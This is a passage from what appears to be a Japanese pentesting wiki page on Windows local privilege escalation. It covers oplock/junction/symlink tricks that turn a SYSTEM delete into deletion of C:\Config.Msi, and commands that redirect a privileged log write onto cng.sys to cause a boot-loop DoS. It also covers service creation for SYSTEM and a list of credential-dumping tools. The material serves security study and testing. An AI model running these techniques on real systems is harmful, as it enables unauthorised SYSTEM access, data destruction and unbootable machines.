DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除する primitive は使えないものの、攻撃者が制御するフォルダーの**内容を削除できる**場合はどうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって**実行が一時停止します**。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御がコールバックに渡されます。

4. Step 4: oplock コールバック内 — 削除先をリダイレクトする

- Option A: `file1.txt` を別の場所に移動する
    - oplock を解除せずに `folder1` を空にできます。
    - `file1.txt` を直接削除しないでください — そうすると oplock が早まって解除されます。

- Option B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを格納する NTFS の内部ストリームを対象とします。これを削除すると、フォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは処理を続け、`file1.txt` を削除しようとします。
- しかし、junction + symlink によって、実際に削除されるのは次のものです：
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` が SYSTEM によって削除されます。

### 任意のフォルダー作成から永続的な DoS へ

**任意のフォルダーを SYSTEM/admin として作成できる**プリミティブを悪用します。**ファイルを書き込めない**、または**弱いアクセス許可を設定できない**場合でも可能です。

**重要な Windows ドライバー**の名前で**フォルダー**（ファイルではなく）を作成します。例:
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **事前にフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダーを検出しますが、**実際のドライバーを解決できず**、**クラッシュするか起動が停止します**。
- **フォールバックはなく**、外部から介入（ブート修復やディスクへのアクセスなど）しない限り、**復旧できません**。

### 特権ログ／バックアップパスと OM symlinks から任意ファイルの上書き／ブート DoS へ

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログ／エクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points**でそのパスをリダイレクトすると、特権による書き込みを任意ファイルの上書きに利用できます（SeCreateSymbolicLinkPrivilege がなくても可能）。<sup>[[15]](#references)</sup>

**要件**
- 対象パスを記録した設定ファイルが攻撃者によって書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃チェーンの例**
1. 設定ファイルを読み取り、特権ログの保存先を特定します。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin 権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むまで待ちます（例: 管理者が「テスト SMS を送信」を実行する）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を調べ（hex/PE parser）、破損を確認します。再起動すると、Windows は改ざんされたドライバーのパスから読み込むため、**boot loop DoS** が発生します。これは、特権サービスが書き込み用に開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合は、そちらが先に試されることがあり、破損データを書き込む確実な DoS の標的になります。



## **High Integrity から System へ**

### **新しい service**

すでに High Integrity のプロセスで実行している場合、**SYSTEM への道筋**は、新しい service を作成して実行するだけで簡単に実現できます。

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する際は、有効なserviceであること、または必要な処理をすばやく実行することを確認してください。有効なserviceでない場合、20秒後に終了させられます。

### AlwaysInstallElevated

High Integrityプロセスから、**AlwaysInstallElevatedのレジストリエントリを有効に**し、_**.msi**_ wrapperを使ってreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法についてはこちらをご覧ください。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### SeDebug + SeImpersonateからFull Token privilegesへ

これらのtoken privilegesを持っている場合（おそらく、すでにHigh Integrityのプロセスで見つかるでしょう）、SeDebug privilegeを使って（保護されたプロセスを除く）**ほぼすべてのプロセスを開き**、そのプロセスの**tokenをコピー**して、そのtokenで**任意のプロセスを作成**できます。\
この手法では通常、すべてのtoken privilegesを持つSYSTEM実行中のプロセスを**選択します**（_はい、すべてのtoken privilegesを持たないSYSTEMプロセスも見つかります_）。\
**提案した手法を実行するコードの** [**例はこちらです**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この手法はmeterpreterが`getsystem`で権限昇格する際に使われます。**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**手法です。次に、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**は、pipe client（service）のtokenを**偽装**してSYSTEM privilegesを取得できます。\
[name pipesについて詳しく知りたい場合はこちらをお読みください。](#named-pipe-client-impersonation)\
[name pipesを使ってhigh integrityからSystemに移行する例はこちらをお読みください。](from-high-integrity-to-system-with-name-pipes.md)

### Dll Hijacking

**SYSTEMとして実行されている**プロセスによって**読み込まれる**dllの**hijackに成功すれば**、その権限で任意のコードを実行できます。そのため、Dll Hijackingもこの種の権限昇格に有効です。さらに、dllの読み込みに使われるフォルダーへの**書き込み権限**を持つため、**High Integrityプロセスからはるかに簡単に実行できます**。\
**Dll hijackingについて詳しくは** [**こちらをご覧ください**](dll-hijacking/index.html)**。**

### **AdministratorまたはNetwork ServiceからSystemへ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICEまたはNETWORK SERVICEからfull privsへ

**読む:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsのローカル権限昇格ベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルを確認します（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出されます。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 設定ミスの可能性を確認し、情報を収集します（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスを確認します**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みセッション情報を抽出します。ローカル環境では-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出されます。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体でsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShellのADIDNS/LLMNR/mDNS spoofingおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的なWindows privesc列挙ツール**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc脆弱性を検索します（Watsonにより非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（Admin権限が必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc脆弱性を検索します（VisualStudioでコンパイルする必要があります）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してホストを列挙します（privescというより情報収集ツールです）（コンパイルが必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpをC#に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスを確認します（githubにprecompiled executableがあります）。推奨されません。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスの可能性を確認します（pythonからのexe）。推奨されません。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿をもとに作成されたツールです（正常に動作するためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、利用可能なexploitを提示します（ローカルPython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、利用可能なexploitを提示します（ローカルPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しいバージョンの.NETを使用してプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている.NETのバージョンを確認するには、次のようにします。

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows 権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [脆弱なフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows 権限昇格 - チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux ローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows 攻撃: ATは新たな定番 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows 権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows 権限昇格チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows 権限昇格](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester向けWindows権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBAマクロフィッシング → hMailServer認証情報の復号 → Veeam CVE-2023-27532によるSYSTEM権限取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) とカーネルトークン窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: カーネルの影における追跡と逃走](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Linkテストツール – CreateSymlinkの使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: WindowsでのSymbolic Linkの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windowsにおける危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.jsモジュール: `node_modules`フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - サービスバイナリのハイジャック](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [MicroslopでのPwn2Own: CLDFLTとDirectXカーネルのRace Conditionを連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する1つのI/O Ring: Windows 11における完全な読み書きExploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用した権限昇格とその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPsのExploitコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS攻撃パート2: CVE-2020-1013、Windows 10のLocal Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを調べる](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: イメージ変更が権限昇格につながる場合](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh AgentからSSH秘密鍵を抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 企業の更新サーバーをバックドア製造工場に変える (0_o) – パート1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 企業の更新サーバーをバックドア製造工場に変える (0_o) – パート2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installerフォルダー削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEMへの道のりをたどり直す](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
